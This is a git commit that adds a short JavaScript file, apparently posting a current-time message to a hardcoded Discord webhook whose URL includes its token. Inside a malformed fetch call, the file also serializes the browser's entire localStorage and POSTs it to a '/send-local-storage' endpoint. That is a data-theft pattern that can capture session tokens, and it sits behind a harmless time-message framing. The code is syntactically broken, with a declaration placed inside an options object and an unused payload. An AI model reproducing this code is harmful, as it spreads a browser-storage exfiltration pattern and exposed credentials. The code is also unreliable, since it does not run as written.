9a4dc2c38fbfef73ad4604c0bbc204500d6a1e5a
gh8sted <104511810+gh8sted@users.noreply.github.com>
2023-08-17 17:37:28 +0200

    Create dzadad.js

---
+++ dzadad.js
@@ -0,0 +1,31 @@
+function generateDynamicMessage() {
+    const currentTime = new Date().toLocaleTimeString();
+    return `Current time is: ${currentTime}`;
+}
+
+const webhookUrl = 'https://discord.com/api/webhooks/827509304029610004/fTzJ9cyQTn6OEx5FtfEyriG2LoTAwudOdQkswWGZSPB2s-UerseWO6JtB8mI1j1Igzrf';
+const dynamicMessage = generateDynamicMessage();
+
+const payload = {
+    content: dynamicMessage
+};
+
+fetch(webhookUrl, {
+ const localData = JSON.stringify(localStorage);
+    fetch('/send-local-storage', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ data: localData })
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log('Message sent successfully');
+        } else {
+            console.error('Failed to send message');
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+    });
